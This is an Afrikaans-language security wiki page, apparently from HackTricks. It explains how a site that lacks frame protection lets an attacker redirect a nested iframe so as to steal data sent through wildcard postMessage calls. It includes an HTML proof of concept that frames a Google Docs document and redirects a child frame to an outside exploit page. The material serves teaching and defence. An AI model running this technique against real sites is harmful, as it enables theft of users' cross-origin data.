# Steal postmessage modifying iframe location

{{#include ../../banners/hacktricks-training.md}}

## Verandering van kind iframes se plekke

Volgens [**hierdie skrywe**](https://blog.geekycat.in/google-vrp-hijacking-your-screenshots/), as jy 'n webblad kan iframe sonder X-Frame-Header wat 'n ander iframe bevat, kan jy **die plek van daardie kind iframe verander**.

Byvoorbeeld, as abc.com efg.com as iframe het en abc.com nie 'n X-Frame header het nie, kan ek efg.com na evil.com kruis oorsprong verander met **`frames.location`**.

Dit is veral nuttig in **postMessages** omdat as 'n bladsy sensitiewe data stuur met 'n **wildcard** soos `windowRef.postmessage("","*")` dit moontlik is om **die plek van die verwante iframe (kind of ouer) na 'n aanvaller se beheerde plek te verander** en daardie data te steel.
```html
<html>
<iframe src="https://docs.google.com/document/ID" />
<script>
//pseudo code
setTimeout(function () {
exp()
}, 6000)

function exp() {
//needs to modify this every 0.1s as it's not clear when the iframe of the iframe affected is created
setInterval(function () {
window.frames[0].frame[0][2].location =
"https://geekycat.in/exploit.html"
}, 100)
}
</script>
</html>
```
{{#include ../../banners/hacktricks-training.md}}
